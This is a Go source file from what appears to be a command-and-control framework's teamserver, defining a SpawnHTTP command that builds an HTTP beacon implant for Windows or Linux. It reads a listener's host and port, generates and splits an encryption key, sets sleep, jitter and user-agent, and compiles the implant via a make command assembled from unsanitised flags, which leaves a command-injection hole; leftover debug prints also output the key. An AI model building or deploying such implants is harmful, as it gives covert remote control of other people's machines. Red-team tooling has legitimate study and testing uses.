package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"strconv"

	bingo_errors "github.com/bingoc2/bingoc2-framework/teamserver/errors"
	grumble "github.com/bingoc2/bingoc2-framework/teamserver/grumble_modified"
	"github.com/bingoc2/bingoc2-framework/teamserver/hellsgopher"
	"github.com/bingoc2/bingoc2-framework/teamserver/logging"
	"github.com/bingoc2/bingoc2-framework/teamserver/management"
	"github.com/bingoc2/bingoc2-framework/teamserver/version"
	yamlstructs "github.com/bingoc2/bingoc2-framework/teamserver/yaml_structs"
	"gopkg.in/yaml.v3"
)

func SpawnHTTP(c *grumble.Context) error {
	// assign vars to flags
	path := c.Flags.String("path")
	listener := c.Flags.String("listener")
	rhost := c.Flags.String("rhost")
	sleep := c.Flags.Int("sleep")
	jitter := c.Flags.Int("jitter")
	opsys := c.Flags.String("os")
	arch := c.Flags.String("arch")
	useragent := c.Flags.String("user-agent")

	// read listener data
	file := version.LISTENER_DATA_DIR + listener + ".yaml"
	yFile, err := os.ReadFile(file)
	if err != nil {
		return err
	}

	var data yamlstructs.ListenerDataYaml
	err = yaml.Unmarshal(yFile, &data)
	if err != nil {
		return err
	}

	var RHOST string
	if rhost == "" {
		if data.LHOST == "0.0.0.0" {
			return bingo_errors.ErrInvalidRHOST
		}

		RHOST = data.LHOST
	} else {
		RHOST = rhost
	}

	RPORT := data.LPORT
	URI := data.URI

	// generate name
	name := management.GenerateName()

	// error handling
	// check valid listener
	if !hellsgopher.DoesFileExist(fmt.Sprintf(version.LISTENER_DATA_DIR+"%s.yaml", listener)) {
		return bingo_errors.ErrInvalidListener
	}

	// check valid os
	if opsys != "windows" && opsys != "linux" {
		return bingo_errors.ErrInvalidOS
	}

	// check valid arch
	if arch != "amd64" && arch != "i386" {
		return bingo_errors.ErrInvalidArch
	}

	// generate key
	key, err := hellsgopher.GenerateKey()
	if err != nil {
		return err
	}

	fmt.Println(key)

	// write data to file
	newBeaconData := yamlstructs.BeaconDataYaml{
		Name:      name,
		Key:       key,
		Sleep:     sleep,
		Jitter:    jitter,
		Listener:  listener,
		UserAgent: useragent,
		GOOS:      opsys,
		GOARCH:    arch,
	}

	yamlData, err := yaml.Marshal(&newBeaconData)
	if err != nil {
		return err
	}
	os.WriteFile(fmt.Sprintf(version.BEACON_DATA_DIR+"%s.yaml", name), yamlData, 0666)

	// build beacon
	if opsys == "windows" {
		name += ".exe"
	}

	fmt.Println("test")

	keyA := key[:8]
	fmt.Println(keyA)
	keyB := key[8:16]
	fmt.Println(keyB)
	keyC := key[16:24]
	fmt.Println(keyC)
	keyD := key[24:32]
	fmt.Println(keyD)

	fmt.Println("test")

	nKeyA := binary.BigEndian.Uint64(keyA)
	fmt.Println(nKeyA)
	nKeyB := binary.BigEndian.Uint64(keyB)
	fmt.Println(nKeyB)
	nKeyC := binary.BigEndian.Uint64(keyC)
	fmt.Println(nKeyC)
	nKeyD := binary.BigEndian.Uint64(keyD)
	fmt.Println(nKeyD)

	fmt.Println("test3")

	sKeyA := strconv.FormatUint(nKeyA, 10)
	sKeyB := strconv.FormatUint(nKeyB, 10)
	sKeyC := strconv.FormatUint(nKeyC, 10)
	sKeyD := strconv.FormatUint(nKeyD, 10)

	fmt.Println("test4")

	output, err := hellsgopher.CmdReturn(fmt.Sprintf("make -C ./agent/http/%s/ BEACON_NAME=%s KEYA=\"%s\" KEYB=\"%s\" KEYC=\"%s\" KEYD=\"%s\" sSLEEP=%d sJITTER=%d RHOST=%s RPORT=%s LISTENER_NAME=%s USERAGENT=%s URI=%s BINARY_NAME=%s cGOOS=%s cGOARCH=%s SPAWN_PATH=%s", opsys, name, sKeyA, sKeyB, sKeyC, sKeyD, sleep, jitter, RHOST, RPORT, listener, useragent, URI, name, opsys, arch, path))

	fmt.Println("Output: ", string(output))
	fmt.Println("Error: ", err)

	logging.Okay(fmt.Sprintf("Successfully generated beacon (%s)", name), c)

	return nil
}
